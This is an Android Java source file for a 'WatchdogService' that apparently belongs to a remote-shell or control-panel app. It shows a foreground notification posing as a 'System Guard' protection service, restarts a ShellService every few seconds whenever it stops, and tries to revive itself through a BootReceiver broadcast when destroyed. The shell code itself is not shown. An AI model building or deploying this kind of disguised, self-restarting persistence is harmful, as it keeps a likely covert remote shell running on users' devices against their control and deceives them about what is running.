package com.java.panel;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

public class WatchdogService extends Service {

    public static WatchdogService instance;
    private volatile boolean isRunning = true;
    private long checkInterval = 5000;

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.hasExtra("interval")) {
            long customInterval = intent.getLongExtra("interval", 5000);
            if (customInterval > 1000) {
                checkInterval = customInterval;
            }
        }

        createNotificationChannel();
        Notification notification = new NotificationCompat.Builder(this, "WatchdogChannel")
                .setContentTitle("System Guard Active")
                .setContentText("Background continuity and protection service running")
                .setSmallIcon(android.R.drawable.ic_menu_rotate)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
        startForeground(2, notification);

        startWatchdogLoop();

        return START_STICKY;
    }

    private void startWatchdogLoop() {
        new Thread(() -> {
            while (isRunning) {
                try {
                    if (ShellService.instance == null) {
                        Intent serviceIntent = new Intent(getApplicationContext(), ShellService.class);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            startForegroundService(serviceIntent);
                        } else {
                            startService(serviceIntent);
                        }
                    }
                } catch (Exception ignored) {
                }

                try {
                    Thread.sleep(checkInterval);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }
        }).start();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    "WatchdogChannel",
                    "Watchdog Guard Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isRunning = false;
        instance = null;
        
        try {
            Intent broadcastIntent = new Intent(getApplicationContext(), BootReceiver.class);
            sendBroadcast(broadcastIntent);
        } catch (Exception ignored) {
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
